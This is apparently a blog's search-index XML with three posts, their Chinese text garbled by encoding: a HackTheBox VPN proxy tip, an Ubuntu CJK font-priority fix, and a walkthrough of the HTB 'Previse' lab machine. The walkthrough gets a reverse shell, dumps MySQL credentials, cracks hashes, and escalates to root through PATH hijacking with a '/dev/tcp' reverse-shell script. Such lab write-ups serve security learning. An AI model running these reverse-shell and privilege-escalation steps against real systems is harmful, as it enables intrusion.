<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>HackTheBox-ç½‘ç»œå»¶è¿Ÿä¼˜åŒ–</title>
    <url>/Hackthebox/htb/hackthebox/</url>
    <content><![CDATA[<img src="/Hackthebox/htb/hackthebox/image-20250411140726536.png" class="">

<span id="more"></span>

<h3 id="1-ä¼˜åŒ–ç»“æœ"><a href="#1-ä¼˜åŒ–ç»“æœ" class="headerlink" title="1. ä¼˜åŒ–ç»“æœ"></a>1. ä¼˜åŒ–ç»“æœ</h3><h4 id="ç½‘ç»œä¼˜åŒ–å‰"><a href="#ç½‘ç»œä¼˜åŒ–å‰" class="headerlink" title="ç½‘ç»œä¼˜åŒ–å‰"></a>ç½‘ç»œä¼˜åŒ–å‰</h4><img src="/Hackthebox/htb/hackthebox/image-20250410225239612.png" class="" title="å»¶è¿Ÿ">

<h4 id="ç½‘ç»œä¼˜åŒ–å"><a href="#ç½‘ç»œä¼˜åŒ–å" class="headerlink" title="ç½‘ç»œä¼˜åŒ–å"></a>ç½‘ç»œä¼˜åŒ–å</h4><img src="/Hackthebox/htb/hackthebox/image-20250410230011943.png" class="" title="å»¶è¿Ÿ">



<h3 id="2-æ“ä½œæ­¥éª¤"><a href="#2-æ“ä½œæ­¥éª¤" class="headerlink" title="2. æ“ä½œæ­¥éª¤"></a>2. æ“ä½œæ­¥éª¤</h3><h4 id="1-é€‰æ‹©èŠ‚ç‚¹"><a href="#1-é€‰æ‹©èŠ‚ç‚¹" class="headerlink" title="1.é€‰æ‹©èŠ‚ç‚¹"></a>1.é€‰æ‹©èŠ‚ç‚¹</h4><p>æœ€å¥½é€‰æ‹©æ–°åŠ å¡èŠ‚ç‚¹å¹¶ä¸”é€‰æ‹©TCP 443</p>
<img src="/Hackthebox/htb/hackthebox/image-20250410230624757.png" class="" title="OpenVPNèŠ‚ç‚¹">

<h4 id="2-é…ç½®VPNæ–‡ä»¶"><a href="#2-é…ç½®VPNæ–‡ä»¶" class="headerlink" title="2. é…ç½®VPNæ–‡ä»¶"></a>2. é…ç½®VPNæ–‡ä»¶</h4><p>æ‰“å¼€ä¸‹è½½çš„VPNé…ç½®æ–‡ä»¶ï¼Œå¯ä»¥çœ‹åˆ°è¿œç¨‹åœ°å€ä¸ºhackthebox.euï¼Œåœ¨é…ç½®æ–‡ä»¶ä¸­æ·»åŠ ä»£ç†ï¼Œä½¿OpenVPN é€šè¿‡ä»£ç†æ¥å…¥hackthebox</p>
<p>httpä»£ç†ï¼šhttp-proxy  ip port</p>
<p>socks5 ä»£ç†ï¼šsocks-proxy ip port </p>
<img src="/Hackthebox/htb/hackthebox/image-20250410234918886.png" class="" title="OpenVPNé…ç½®">

<h4 id="3-ä»£ç†é…ç½®"><a href="#3-ä»£ç†é…ç½®" class="headerlink" title="3.ä»£ç†é…ç½®"></a>3.ä»£ç†é…ç½®</h4><h5 id="Shadowrocket"><a href="#Shadowrocket" class="headerlink" title="Shadowrocket"></a>Shadowrocket</h5><p>èŠ‚ç‚¹æœ€å¥½å¯ç”¨æ–°åŠ å¡èŠ‚ç‚¹å’Œhacktheboxä¿æŒä¸€è‡´ï¼Œç¡®ä¿å…¨å±€è·¯ç”±ä¸ºé…ç½®ï¼Œåé¢ä¼šä¿®æ”¹é…ç½®æ–‡ä»¶</p>
<img src="/Hackthebox/htb/hackthebox/image-20250410231454084.png" class="" title="shadowrocketé…ç½®">

<p>ç¼–è¾‘å·²ç»å¯ç”¨çš„é…ç½®æ–‡ä»¶</p>
<img src="/Hackthebox/htb/hackthebox/8bc936b78cd0d13f554c9222008a49c1.jpg" class="" title="shadowrocketé…ç½®">

<p>é€‰ä¸­è§„åˆ™å¹¶æ·»åŠ </p>
<img src="/Hackthebox/htb/hackthebox/cb12c060679dc74320061baa709f7a34.jpg" class="" title="shadowrocketé…ç½®">

<p>ç±»å‹é€‰æ‹©<code>DOMAIN-KEYWORD</code> ç­–ç•¥é€‰æ‹©<code>PROXY</code> åŸŸåå¡«å†™ hackthebox è¿™ä¸ªå°±æ˜¯OpenVPNé…ç½®æ–‡ä»¶ä¸­é‚£ä¸ªåŸŸåï¼Œå¦‚æœæ˜¯ä½¿ç”¨pwnboxçš„è¯ï¼Œå¯ä»¥æŠŠ<code>htb</code> æ·»åŠ åˆ°åŸŸåé‚£æ </p>
<img src="/Hackthebox/htb/hackthebox/227a91d96734bec314c24413838c530f.jpg" class="" title="shadowrocketé…ç½®">

<p>æ³¨æ„ä¿å­˜ï¼Œç¡®ä¿è§„åˆ™æœ‰æ•ˆ</p>
<img src="/Hackthebox/htb/hackthebox/43ad2ecee9d2edc8fa497daf420769fd.jpg" class="" title="shadowrocketé…ç½®">

<p>æ‰“å¼€ä»£ç†å…±äº«ï¼Œå¹¶å°†åœ°å€é…ç½®åˆ°OpenVPNé…ç½®æ–‡ä»¶ä¸­</p>
<img src="/Hackthebox/htb/hackthebox/1e6f487557bb177f8be2a20e335b4ade.jpg" class="" title="shadowrocketé…ç½®">

<h5 id="Clash"><a href="#Clash" class="headerlink" title="Clash"></a>Clash</h5><p>åœ¨Clashè®¾ç½®ä¸­å¯ç”¨<code>è™šæ‹Ÿç½‘å¡æ¨¡å¼</code>  ç«¯å£è®¾ç½®ä¸­æ‰“å¼€<code>SOCKSä»£ç†ç«¯å£</code>  </p>
<img src="/Hackthebox/htb/hackthebox/image-20250410232456699.png" class="" title="clashé…ç½®">

<p>æ‰“å¼€è®¢é˜…ï¼Œå³é”®<code>è®¢é˜…æ–‡ä»¶</code>ç‚¹å‡»<code>ç¼–è¾‘è§„åˆ™</code></p>
<img src="/Hackthebox/htb/hackthebox/image-20250410234047925.png" class="" title="clashé…ç½®">

<p>åœ¨ç¼–è¾‘è§„åˆ™ä¸­ ï¼šè§„åˆ™ç±»å‹é€‰æ‹©<code>DOMAIN-KEYWORD</code> ï¼Œä»£ç†ç­–ç•¥é€‰æ‹©ä»£ç†ç»„ï¼Œè§„åˆ™å†…å®¹å¡«å†™ hackthebox</p>
<img src="/Hackthebox/htb/hackthebox/image-20250410234207924.png" class="" title="clashé…ç½®">

<p>ä»£ç†ç»„çš„é€‰æ‹©å–å†³äºè®¢é˜…ï¼ŒèŠ‚ç‚¹ä¾æ—§é€‰æ‹©åŒåœ°åŒºï¼Œæ³¨æ„æ›´æ–°è®¢é˜…å¯èƒ½ä¼šè¦†ç›–è‡ªå®šä¹‰è§„åˆ™</p>
<img src="/Hackthebox/htb/hackthebox/image-20250410234325521.png" class="" title="clashé…ç½®">





]]></content>
      <categories>
        <category>Hackthebox</category>
      </categories>
      <tags>
        <tag>HTBç½‘ç»œå»¶è¿Ÿä¼˜åŒ–</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu 24.04 ä¸­æ–‡å­—ä½“æ¸²æŸ“</title>
    <url>/OS%E4%BC%98%E5%8C%96/os/ubuntu%E4%BC%98%E5%8C%96/</url>
    <content><![CDATA[<img src="/OS%E4%BC%98%E5%8C%96/os/ubuntu%E4%BC%98%E5%8C%96/image-20250416104913620.png" class="">

<span id="more"></span>

<h3 id="èƒŒæ™¯"><a href="#èƒŒæ™¯" class="headerlink" title="èƒŒæ™¯"></a>èƒŒæ™¯</h3><p>è¿‘æœŸå…¥æ‰‹äº†ä¸€å°2.8kå±å¹•çš„æ–°æœ¬ï¼Œå®‰è£…äº†ubuntu24.04 åœ¨ç³»ç»Ÿè¯­è¨€é»˜è®¤ä¸ºè‹±æ–‡æ—¶ï¼Œä¸­æ–‡å­—ä½“çœ‹ç€éå¸¸åˆ«æ‰­ï¼Œæœ‰äº›å­—ä½“ç”šè‡³å‡ºç°åŠæ ¼æƒ…å†µï¼Œæ¯”å¦‚<code>å¤</code> ï¼ŒæŸ¥äº†ä¸€äº›èµ„æ–™åŸå› æ˜¯å­—ä½“æ˜¾ç¤ºä¼˜å…ˆçº§çš„é—®é¢˜ï¼Œè§£å†³æ–¹æ¡ˆä¿®æ”¹å­—ä½“ä¼˜å…ˆçº§å³å¯</p>
<h3 id="è§£å†³æ–¹æ¡ˆ"><a href="#è§£å†³æ–¹æ¡ˆ" class="headerlink" title="è§£å†³æ–¹æ¡ˆ"></a>è§£å†³æ–¹æ¡ˆ</h3><p>è¿›å…¥<code>/usr/share/fontconfig/conf.avail</code> ç›®å½•ï¼Œæ‰“å¼€<code>64-language-selector-cjk-prefer.conf</code> æ–‡ä»¶å¯ä»¥çœ‹åˆ°CJK (æ˜¯ä¸­æ–‡ã€æ—¥æ–‡å’ŒéŸ©æ–‡çš„å­—æ¯ç¼©å†™) é¡ºåºæ—¥å¼ä¸­æ–‡ä¼˜å…ˆçº§é«˜äºç®€ä½“ä¸­æ–‡ã€‚ç›´æ¥è°ƒæ¢ä½ç½®å°†ç®€ä½“ä¸­æ–‡æ”¾åˆ°æœ€å…ˆã€‚</p>
<pre class="language-none"><code class="language-none">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;
&lt;!DOCTYPE fontconfig SYSTEM &quot;fonts.dtd&quot;&gt;
&lt;fontconfig&gt;
        &lt;alias&gt;
                &lt;family&gt;sans-serif&lt;&#x2F;family&gt;
                &lt;prefer&gt;
                        &lt;family&gt;Noto Sans CJK JP&lt;&#x2F;family&gt;
                        &lt;family&gt;Noto Sans CJK KR&lt;&#x2F;family&gt;
                        &lt;family&gt;Noto Sans CJK SC&lt;&#x2F;family&gt;
                        &lt;family&gt;Noto Sans CJK TC&lt;&#x2F;family&gt;
                        &lt;family&gt;Noto Sans CJK HK&lt;&#x2F;family&gt;
                &lt;&#x2F;prefer&gt;
        &lt;&#x2F;alias&gt;
        &lt;alias&gt;
                &lt;family&gt;serif&lt;&#x2F;family&gt;
                &lt;prefer&gt;
                        &lt;family&gt;Noto Serif CJK JP&lt;&#x2F;family&gt;
                        &lt;family&gt;Noto Serif CJK KR&lt;&#x2F;family&gt;
                        &lt;family&gt;Noto Serif CJK SC&lt;&#x2F;family&gt;
                        &lt;family&gt;Noto Serif CJK TC&lt;&#x2F;family&gt;
                &lt;&#x2F;prefer&gt;
        &lt;&#x2F;alias&gt;
        &lt;alias&gt;
                &lt;family&gt;monospace&lt;&#x2F;family&gt;
                &lt;prefer&gt;
                        &lt;family&gt;Noto Sans Mono CJK JP&lt;&#x2F;family&gt;
                        &lt;family&gt;Noto Sans Mono CJK KR&lt;&#x2F;family&gt;
                        &lt;family&gt;Noto Sans Mono CJK SC&lt;&#x2F;family&gt;
                        &lt;family&gt;Noto Sans Mono CJK TC&lt;&#x2F;family&gt;
                        &lt;family&gt;Noto Sans Mono CJK HK&lt;&#x2F;family&gt;
                &lt;&#x2F;prefer&gt;
        &lt;&#x2F;alias&gt;
&lt;&#x2F;fontconfig&gt;</code></pre>

<p>ä¿®æ”¹å</p>
<pre class="language-none"><code class="language-none">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;
&lt;!DOCTYPE fontconfig SYSTEM &quot;fonts.dtd&quot;&gt;
&lt;fontconfig&gt;
        &lt;alias&gt;
                &lt;family&gt;sans-serif&lt;&#x2F;family&gt;
                &lt;prefer&gt;
                        &lt;family&gt;Noto Sans CJK SC&lt;&#x2F;family&gt;
                        &lt;family&gt;Noto Sans CJK KR&lt;&#x2F;family&gt;
                        &lt;family&gt;Noto Sans CJK JP&lt;&#x2F;family&gt;
                        &lt;family&gt;Noto Sans CJK TC&lt;&#x2F;family&gt;
                        &lt;family&gt;Noto Sans CJK HK&lt;&#x2F;family&gt;
                &lt;&#x2F;prefer&gt;
        &lt;&#x2F;alias&gt;
        &lt;alias&gt;
                &lt;family&gt;serif&lt;&#x2F;family&gt;
                &lt;prefer&gt;
                        &lt;family&gt;Noto Serif CJK SC&lt;&#x2F;family&gt;
                        &lt;family&gt;Noto Serif CJK KR&lt;&#x2F;family&gt;
                        &lt;family&gt;Noto Serif CJK JP&lt;&#x2F;family&gt;
                        &lt;family&gt;Noto Serif CJK TC&lt;&#x2F;family&gt;
                &lt;&#x2F;prefer&gt;
        &lt;&#x2F;alias&gt;
        &lt;alias&gt;
                &lt;family&gt;monospace&lt;&#x2F;family&gt;
                &lt;prefer&gt;
                        &lt;family&gt;Noto Sans Mono CJK SC&lt;&#x2F;family&gt;
                        &lt;family&gt;Noto Sans Mono CJK KR&lt;&#x2F;family&gt;
                        &lt;family&gt;Noto Sans Mono CJK JP&lt;&#x2F;family&gt;
                        &lt;family&gt;Noto Sans Mono CJK TC&lt;&#x2F;family&gt;
                        &lt;family&gt;Noto Sans Mono CJK HK&lt;&#x2F;family&gt;
                &lt;&#x2F;prefer&gt;
        &lt;&#x2F;alias&gt;
&lt;&#x2F;fontconfig&gt;</code></pre>

<p>æ•ˆæœ</p>
<img src="/OS%E4%BC%98%E5%8C%96/os/ubuntu%E4%BC%98%E5%8C%96/image-20250416133422397.png" class="" title="image-20250416133422397">
]]></content>
      <categories>
        <category>OSä¼˜åŒ–</category>
      </categories>
      <tags>
        <tag>OS</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Previse</title>
    <url>/Hackthebox/htb/htb-previse/</url>
    <content><![CDATA[<style>.eyilevuwobhc{zoom:50%;}</style><img src="/Hackthebox/htb/htb-previse/e3c542ada4b134e29e534e3081ef9650.png" class="eyilevuwobhc">

<table>
<thead>
<tr>
<th>OS</th>
<th>Difficulty</th>
</tr>
</thead>
<tbody><tr>
<td>Linux</td>
<td>Easy</td>
</tr>
</tbody></table>
<span id="more"></span>

<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><pre class="language-bash" data-language="bash"><code class="language-bash">$ nmap <span class="token number">10.10</span>.11.104 <span class="token parameter variable">-sC</span> <span class="token parameter variable">-sV</span> -p- <span class="token parameter variable">-T4</span> --min-rate <span class="token number">1000</span> 
Starting Nmap <span class="token number">7.95</span> <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2025</span>-04-04 <span class="token number">14</span>:00 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">10.10</span>.11.104
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.13s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">65533</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
PORT   STATE SERVICE VERSION
<span class="token number">22</span>/tcp <span class="token function">open</span>  <span class="token function">ssh</span>     OpenSSH <span class="token number">7</span>.6p1 Ubuntu 4ubuntu0.3 <span class="token punctuation">(</span>Ubuntu Linux<span class="token punctuation">;</span> protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
<span class="token operator">|</span> ssh-hostkey: 
<span class="token operator">|</span>   <span class="token number">2048</span> <span class="token number">53</span>:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 <span class="token punctuation">(</span>RSA<span class="token punctuation">)</span>
<span class="token operator">|</span>   <span class="token number">256</span> bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span>
<span class="token operator">|</span>_  <span class="token number">256</span> <span class="token number">33</span>:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span>
<span class="token number">80</span>/tcp <span class="token function">open</span>  http    Apache httpd <span class="token number">2.4</span>.29 <span class="token variable"><span class="token punctuation">((</span>Ubuntu<span class="token punctuation">))</span></span>
<span class="token operator">|</span> http-cookie-flags: 
<span class="token operator">|</span>   /: 
<span class="token operator">|</span>     PHPSESSID: 
<span class="token operator">|</span>_      httponly flag not <span class="token builtin class-name">set</span>
<span class="token operator">|</span> http-title: Previse Login
<span class="token operator">|</span>_Requested resource was login.php
<span class="token operator">|</span>_http-server-header: Apache/2.4.29 <span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span>
Service Info: OS: Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">81.53</span> seconds</code></pre>

<h3 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><p>è®¿é—®80ç«¯å£æ‰¾åˆ°ä¸€ä¸ªç™»å½•é¡µé¢</p>
<img src="/Hackthebox/htb/htb-previse/image-20250404152518515.png" class="" title="ç™»å½•é¡µé¢">

<p>ä½¿ç”¨burp æŠ“åŒ…æŸ¥çœ‹ç«™ç‚¹ç›®å½•ï¼Œæ‰¾åˆ°ä¸€ä¸ªaccounts.php</p>
<img src="/Hackthebox/htb/htb-previse/image-20250404152429829.png" class="" title="burp">

<p>è®¿é—®è¿™ä¸ªaccounts.phpï¼Œå‘ç°è·³è½¬ä¸è¿‡å»ï¼Œå¯ä»¥å°è¯•ä¿®æ”¹å“åº”åŒ… <code>Locationï¼šlogin.php</code> ï¼Œä¹‹åè·³è½¬åˆ° accounts.php </p>
<img src="/Hackthebox/htb/htb-previse/image-20250404152719306.png" class="" title="burp">

<img src="/Hackthebox/htb/htb-previse/image-20250404141506785.png" class="" title="add new account">

<p>æ·»åŠ ä¸€ä¸ªæ–°è´¦å·ï¼Œç„¶åç™»å½•å¯ä»¥æ‰¾åˆ°ç«™ç‚¹å¤‡ä»½çš„å‹ç¼©åŒ…</p>
<img src="/Hackthebox/htb/htb-previse/image-20250404142341145.png" class="" title="ç™»å½•">

<p>ä¸‹è½½å¹¶è§£å‹åœ¨config.phpä¸­å¯ä»¥æ‰¾åˆ°mysqlçš„ç”¨æˆ·åå’Œå¯†ç </p>
<img src="/Hackthebox/htb/htb-previse/image-20250404142515834.png" class="" title="å‹ç¼©åŒ…">

<img src="/Hackthebox/htb/htb-previse/image-20250404142709658.png" class="" title="æ•°æ®åº“é…ç½®">

<p>åˆ†æå…¶ä»–phpæ–‡ä»¶ï¼Œåœ¨logs.php ä¸­execæ–¹æ³•ä¸­å¼•ç”¨äº†POSTå…¨å±€å˜é‡</p>
<img src="/Hackthebox/htb/htb-previse/image-20250404142630382.png" class="" title="logs.php">

<p>æ ¹æ®æ ¼å¼ç›´æ¥æ„é€ åå¼¹shellï¼Œæœ€å¥½ä½¿ç”¨url ç¼–ç </p>
<img src="/Hackthebox/htb/htb-previse/image-20250404143853371.png" class="" title="åå¼¹shell">

<p>æˆåŠŸåå¼¹shell</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">nc</span> <span class="token parameter variable">-lnvp</span> <span class="token number">9001</span>                                     
listening on <span class="token punctuation">[</span>any<span class="token punctuation">]</span> <span class="token number">9001</span> <span class="token punctuation">..</span>.
connect to <span class="token punctuation">[</span><span class="token number">10.10</span>.16.39<span class="token punctuation">]</span> from <span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token number">10.10</span>.11.104<span class="token punctuation">]</span> <span class="token number">35844</span>
bash: cannot <span class="token builtin class-name">set</span> terminal process group <span class="token punctuation">(</span><span class="token number">1500</span><span class="token punctuation">)</span>: Inappropriate ioctl <span class="token keyword">for</span> device
bash: no job control <span class="token keyword">in</span> this shell
www-data@previse:/var/www/html$ <span class="token function">id</span>
<span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">(</span>www-data<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">(</span>www-data<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">(</span>www-data<span class="token punctuation">)</span></code></pre>

<h3 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h3><p>é¦–å…ˆç”Ÿæˆäº¤äº’å¼shellï¼Œæ–¹ä¾¿æ“ä½œmysqlï¼Œå¯ä»¥åœ¨æ•°æ®åº“ä¸­æŸ¥è¯¢åˆ°ä¸¤æ¡å¯†ç hash</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">www-data@previse:&#x2F;var&#x2F;www&#x2F;html$ script &#x2F;dev&#x2F;null -c &#x2F;bin&#x2F;bash
script &#x2F;dev&#x2F;null -c &#x2F;bin&#x2F;bash
Script started, file is &#x2F;dev&#x2F;null
www-data@previse:&#x2F;var&#x2F;www&#x2F;html$ mysql -u root -p 
mysql -u root -p 
Enter password: mySQL_p@ssw0rd!:)

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 14
Server version: 5.7.35-0ubuntu0.18.04.1 (Ubuntu)

Copyright (c) 2000, 2021, Oracle and&#x2F;or its affiliates.

Oracle is a registered trademark of Oracle Corporation and&#x2F;or its
affiliates. Other names may be trademarks of their respective
owners.

Type &#39;help;&#39; or &#39;\h&#39; for help. Type &#39;\c&#39; to clear the current input statement.

mysql&gt; show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| previse            |
| sys                |
+--------------------+
5 rows in set (0.00 sec)

mysql&gt; use previse;
use previse;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql&gt; show tables; 
show tables;
+-------------------+
| Tables_in_previse |
+-------------------+
| accounts          |
| files             |
+-------------------+
2 rows in set (0.00 sec)

mysql&gt; select * from accounts;
select * from accounts;
+----+----------+------------------------------------+---------------------+
| id | username | password                           | created_at          |
+----+----------+------------------------------------+---------------------+
|  1 | m4lwhere | $1$ğŸ§‚llol$DQpmdvnb7EeuO6UaqRItf. | 2021-05-27 18:18:36 |
|  2 | admin    | $1$ğŸ§‚llol$uXqzPW6SXUONt.AIOBqLy. | 2025-04-04 05:56:26 |
+----+----------+------------------------------------+---------------------+
2 rows in set (0.00 sec)</code></pre>

<p>ä½¿ç”¨John ç ´è§£hash </p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ john <span class="token number">1</span>.hash <span class="token parameter variable">--wordlist</span><span class="token operator">=</span>/usr/share/wordlists/rockyou.txt <span class="token parameter variable">--format</span><span class="token operator">=</span>md5crypt-long
Using default input encoding: UTF-8
Loaded <span class="token number">2</span> password hashes with no different salts <span class="token punctuation">(</span>md5crypt-long, crypt<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token variable">$1</span>$ <span class="token punctuation">(</span>and variants<span class="token punctuation">)</span> <span class="token punctuation">[</span>MD5 <span class="token number">32</span>/64<span class="token punctuation">]</span><span class="token punctuation">)</span>
Will run <span class="token number">8</span> OpenMP threads
Press <span class="token string">'q'</span> or Ctrl-C to abort, almost any other key <span class="token keyword">for</span> status
admin            <span class="token punctuation">(</span>?<span class="token punctuation">)</span>     
ilovecody112235<span class="token operator">!</span> <span class="token punctuation">(</span>?<span class="token punctuation">)</span>     
2g <span class="token number">0</span>:00:03:00 DONE <span class="token punctuation">(</span><span class="token number">2025</span>-04-04 <span class="token number">14</span>:57<span class="token punctuation">)</span> <span class="token number">0</span>.01108g/s 41100p/s 41100c/s 41210C/s ilovecokey<span class="token punctuation">..</span>ilovecody<span class="token punctuation">..</span>
Use the <span class="token string">"--show"</span> option to display all of the cracked passwords reliably
Session completed. 
</code></pre>

<p>ä½¿ç”¨æ•°æ®åº“ä¸­çš„ç”¨æˆ·åå’Œå¯†ç ç™»å½•ssh</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">ssh</span> m4lwhere@10.10.11.104
The authenticity of <span class="token function">host</span> <span class="token string">'10.10.11.104 (10.10.11.104)'</span> can't be established.
ED25519 key fingerprint is SHA256:BF5tg2bhcRrrCuaeVQXikjd8BCPxgLsnnwHlaBo3dPs.
This key is not known by any other names.
Are you sure you want to <span class="token builtin class-name">continue</span> connecting <span class="token punctuation">(</span>yes/no/<span class="token punctuation">[</span>fingerprint<span class="token punctuation">]</span><span class="token punctuation">)</span>? <span class="token function">yes</span>
<span class="token operator">&lt;</span><span class="token punctuation">..</span>.<span class="token operator">></span>
Last login: Fri Jun <span class="token number">18</span> 01:09:10 <span class="token number">2021</span> from <span class="token number">10.10</span>.10.5
m4lwhere@previse:~$ <span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>m4lwhere<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>m4lwhere<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>m4lwhere<span class="token punctuation">)</span>
m4lwhere@previse:~$ <span class="token function">ls</span>
user.txt</code></pre>

<h3 id="æƒé™æå‡"><a href="#æƒé™æå‡" class="headerlink" title="æƒé™æå‡"></a>æƒé™æå‡</h3><p>ä½¿ç”¨sudo -l æŸ¥çœ‹æ˜¯å¦æœ‰å¯ä»¥åˆ©ç”¨çš„é…ç½®ï¼Œæ‰¾åˆ°ä¸€ä¸ªå¤‡ä»½åŠŸèƒ½çš„è„šæœ¬ï¼ŒæŸ¥çœ‹è„šæœ¬åŠŸèƒ½å¾ˆç®€å•å°±æ˜¯ä½¿ç”¨gzipæŠŠæ—¥å¿—æ–‡ä»¶å½’æ¡£ã€‚</p>
<p>gzip å¹¶ä¸æ˜¯ç»å¯¹è·¯å¾„ï¼Œé‚£å¯ä»¥ä½¿ç”¨pathåŠ«æŒæ¥ææƒï¼Œè¿›å…¥&#x2F;tmp åˆ›å»ºä¸€ä¸ªshellè„šæœ¬ï¼Œå‘½åä¸ºgzipï¼Œå†…å®¹ä¸º</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>
<span class="token function">bash</span> <span class="token parameter variable">-i</span> <span class="token operator">&amp;></span>/dev/tcp/10.10.16.39/9003 <span class="token operator">&lt;</span><span class="token file-descriptor important">&amp;1</span> </code></pre>

<p>ç„¶åå°†&#x2F;tmp æ·»åŠ åˆ°ç¯å¢ƒå˜é‡ï¼Œæœ€åç»™è„šæœ¬æ·»åŠ æ‰§è¡Œæƒé™ï¼Œè¿è¡Œè„šæœ¬</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">m4lwhere@previse:~$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
<span class="token punctuation">[</span>sudo<span class="token punctuation">]</span> password <span class="token keyword">for</span> m4lwhere: 
User m4lwhere may run the following commands on previse:
    <span class="token punctuation">(</span>root<span class="token punctuation">)</span> /opt/scripts/access_backup.sh

m4lwhere@previse:~$ <span class="token function">cat</span> /opt/scripts/access_backup.sh
<span class="token comment">#!/bin/bash</span>

<span class="token comment"># We always make sure to store logs, we take security SERIOUSLY here</span>

<span class="token comment"># I know I shouldnt run this as root but I cant figure it out programmatically on my account</span>
<span class="token comment"># This is configured to run with cron, added to sudo so I can run as needed - we'll fix it later when there's time</span>

<span class="token function">gzip</span> <span class="token parameter variable">-c</span> /var/log/apache2/access.log <span class="token operator">></span> /var/backups/<span class="token variable"><span class="token variable">$(</span><span class="token function">date</span> <span class="token parameter variable">--date</span><span class="token operator">=</span><span class="token string">"yesterday"</span> +%Y%b%d<span class="token variable">)</span></span>_access.gz
<span class="token function">gzip</span> <span class="token parameter variable">-c</span> /var/www/file_access.log <span class="token operator">></span> /var/backups/<span class="token variable"><span class="token variable">$(</span><span class="token function">date</span> <span class="token parameter variable">--date</span><span class="token operator">=</span><span class="token string">"yesterday"</span> +%Y%b%d<span class="token variable">)</span></span>_file_access.gz

m4lwhere@previse:/tmp$ <span class="token builtin class-name">echo</span> <span class="token environment constant">$PATH</span>
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
m4lwhere@previse:/tmp$ <span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token builtin class-name">pwd</span><span class="token variable">`</span></span><span class="token builtin class-name">:</span><span class="token environment constant">$PATH</span>
m4lwhere@previse:/tmp$ <span class="token function">nano</span> <span class="token function">gzip</span> 
m4lwhere@previse:/tmp<span class="token comment"># cat gzip</span>
<span class="token comment">#!/bin/bash</span>
<span class="token function">bash</span> <span class="token parameter variable">-i</span> <span class="token operator">&amp;></span>/dev/tcp/10.10.16.39/9003 <span class="token operator">&lt;</span><span class="token file-descriptor important">&amp;1</span> 

m4lwhere@previse:/tmp$ <span class="token function">chmod</span> +x <span class="token function">gzip</span> 
m4lwhere@previse:/tmp$ <span class="token function">sudo</span> /opt/scripts/access_backup.sh </code></pre>

<p>æˆåŠŸåå¼¹shell</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">nc</span> <span class="token parameter variable">-lnvp</span> <span class="token number">9003</span>
listening on <span class="token punctuation">[</span>any<span class="token punctuation">]</span> <span class="token number">9003</span> <span class="token punctuation">..</span>.
connect to <span class="token punctuation">[</span><span class="token number">10.10</span>.16.39<span class="token punctuation">]</span> from <span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token number">10.10</span>.11.104<span class="token punctuation">]</span> <span class="token number">40558</span>
root@previse:/tmp<span class="token comment"># id      </span>
<span class="token function">id</span>
